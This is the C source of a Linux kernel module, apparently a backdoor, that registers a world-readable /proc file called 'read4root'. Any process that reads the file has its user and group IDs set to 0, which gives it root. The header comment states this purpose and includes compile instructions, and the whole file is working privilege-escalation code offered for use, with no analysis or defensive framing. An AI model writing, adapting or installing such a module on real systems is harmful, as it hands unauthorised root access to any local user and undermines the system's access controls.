/*
 * taskigt.c by noupe [tm@ns2.crw.se]
 * Gives root to the process that reads the
 * special /proc file.
 *
 * Compile with: gcc -c -O2 -fomit-frame-pointer taskigt.c
 * Add -DOLDKERN if you're compiling for Linux 2.0.
 *
 */

#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/stat.h>
#include <linux/fs.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/module.h>	/* Specifically, a module */
#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/sched.h>
#include <asm/uaccess.h>	/* for copy_from_user */


#define PROCNAME "read4root"
#define PROCNAMELEN 9 /* Length of the name above */

int put_inf(char *buffer, char** buffer_location, off_t offset, int buffer_length, int *eof, void * data)
{
	int ret;
//	struct pid* own_pid = file->f_owner.pid;
//	struct task_struct* current = list_first_entry(&own_pid->tasks[0], struct task_struct, tasks[0]);
/*	current->__uid = 0;
	current->__gid = 0;
	current->__euid = 0;
	current->__egid = 0; */
	
//	len = sprintf(d, "Gave root to PID %d (%s)\n", current->pid, current->comm);

	current->uid = 0;
	current->gid = 0;
	current->euid = 0;
	current->egid = 0;
/*	current->cred->uid = 0;
	current->cred->gid = 0;
	current->cred->euid = 0;
	current->cred->egid = 0; */

 	printk(KERN_INFO "Gave root to PID %d (%s)\n", current->pid, current->comm);
	
	if(offset > 0) {
		ret = 0;
	} else {
		ret = sprintf(buffer, "bla\n");
	}
	
	return ret;
}


struct proc_dir_entry *proc_ent;

int init_module(void)
{
	proc_ent = create_proc_entry(PROCNAME, 0777, NULL);
	if(proc_ent != NULL) {
		proc_ent->read_proc = put_inf;
		proc_ent->write_proc = 0;
		proc_ent->owner = THIS_MODULE;
		proc_ent->mode = S_IFREG|S_IRUSR|S_IRGRP|S_IROTH;
		proc_ent->uid = 0;
		proc_ent->gid = 0;
	} else {
		remove_proc_entry(PROCNAME, NULL);
		return -ENOMEM;
	}
	return 0;
}


void cleanup_module(void)
{
	remove_proc_entry(PROCNAME, NULL);
}
